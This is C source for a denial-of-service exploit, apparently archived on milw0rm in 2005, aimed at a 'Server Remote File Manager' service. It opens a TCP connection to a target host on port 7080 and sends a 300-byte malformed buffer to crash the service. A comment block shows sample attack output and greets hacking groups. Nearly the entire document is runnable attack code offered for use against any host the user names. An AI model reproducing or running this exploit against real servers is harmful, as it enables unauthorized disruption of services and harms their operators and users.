/*

 Server Remote File Manager DoS Exploit
-------------------------------------------
  INFGP - Hacking&security Research

[+] Attacking  localhost..
[+] Build DOS string
[+] Buffer size = 300 byte
[+] Sending bad format..
[+] localhost  : Disconected!

Greats: Infam0us Gr0up,Zone-H,securiteam,str0ke-milw0rm,addict3d,
Thomas-secunia,Yudha,c0d3r,Kavling Community,1st Indonesian Security,
Jasakom,ECHO,etc..betst reagrds t0 whell.
Info: 98.to/infamous

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#define size 300

int main (int argc, char *argv[]){

char req[] =
"M_MZ?S.Y?XPKL&>UM&<_.H;YBKL7-YSYNKG&MKL\?X.JIY.HS&"
"<GMN?X+9M_MZ?S.Y?XPKL&>UM&<_.H;YBKL7-YSYNKG&MKL\?"
"X.JIY.HS&<GMN?X+9M_MZ?S.Y?XPKL&>UM&<_.H;YBKL7-YSYN"
"KG&MKL\?X.JIY.HS&<GMN?X+9M_MZ?S.Y?XPKL&>UM&<_.H;YBKL7-"
"qv#trog.ro#mkodph>qv#trog.ro#mkodph\n";

 unsigned int rc,addr,inetsock ;
 struct sockaddr_in tcp;
 struct hostent * hp;
 WSADATA wsaData;
 char buffer[size];

  memset(buffer,'A',300);
  memcpy(buffer,req,25);

  if(argc < 2) {
 printf("\n\n    Server Remote File Manager DoS Exploit \n", argv[0]);
 printf("   -----------------------------------------\n", argv[0]);
 printf("      INFGP - Hacking&Security Research\n\n", argv[0]);
 printf("[-]Usage: %s [target]\n", argv[0]);
 printf("[?]Exam: %s localhost \n", argv[0]);
 exit(-1) ;
       }

 if (WSAStartup(MAKEWORD(2,1),&wsaData) != 0){
  printf("WSAStartup failed !\n");
  exit(-1);
 }
  hp = gethostbyname(argv[1]);
 if (!hp){
  addr = inet_addr(argv[1]);
 }
 if ((!hp) && (addr == INADDR_NONE) ){
  printf("Unable to resolve %s\n",argv[1]);
  exit(-1);
 }
 inetsock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
 if (!inetsock){
  printf("socket() error...\n");
  exit(-1);
 }
  if (hp != NULL)
  memcpy(&(tcp.sin_addr),hp->h_addr,hp->h_length);
 else
  tcp.sin_addr.s_addr = addr;

 if (hp)
  tcp.sin_family = hp->h_addrtype;
 else
  tcp.sin_family = AF_INET;

 tcp.sin_port=htons(7080);

 printf("\n[+] Attacking  %s..\n" , argv[1]) ;
 printf("[+] Build DOS string\n");
 Sleep(1000);
 printf("[+] Buffer size = %d byte\n" , sizeof(buffer));
 rc=connect(inetsock, (struct sockaddr *) &tcp, sizeof (struct sockaddr_in));
 if(rc==0)
 {

 Sleep(1000) ;
 printf("[+] Sending bad format..\n") ;
 send(inetsock , buffer , sizeof(buffer) , 0);
 printf("[+] %s  : Disconected! \n\n" ,  argv[1]) ;
}
 else {
 printf("[-] Port :7080 is invalid.Server not connected!\n");
}
}

// milw0rm.com [2005-05-08]
